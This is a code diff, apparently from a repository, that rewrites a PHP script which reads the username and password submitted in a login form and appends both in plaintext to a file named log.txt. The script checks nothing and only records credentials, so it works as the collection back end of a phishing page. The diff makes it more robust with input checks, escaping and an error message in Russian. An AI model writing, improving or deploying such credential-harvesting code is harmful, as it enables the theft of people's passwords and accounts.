@@ -1,8 +1,19 @@
-$username = $_POST['username'];
-$password = $_POST['password' ];
+<?php
 
-$fp = fopen( filename: 'log.txt', mode: 'a+');
-fwrite($fp, string: 'Username: ' . $username . "\n");
-fwrite($fp, string: 'Password: ' . $password . "\n");
-fwrite($fp, string: '----------------' . "\n");
-fclose($fp);
+$username = isset($_POST['username']) ? $_POST['username'] : 'Unknown';
+$password = isset($_POST['password']) ? $_POST['password'] : 'Unknown';
+
+
+$fp = fopen('log.txt', 'a+');
+if ($fp) {
+ 
+    fwrite($fp, "Username: " . htmlspecialchars($username) . "\n");
+    fwrite($fp, "Password: " . htmlspecialchars($password) . "\n");
+    fwrite($fp, "----------------\n");
+
+  
+    fclose($fp);
+} else {
+    echo "Ошибка при открытии файла.";
+}
+?>
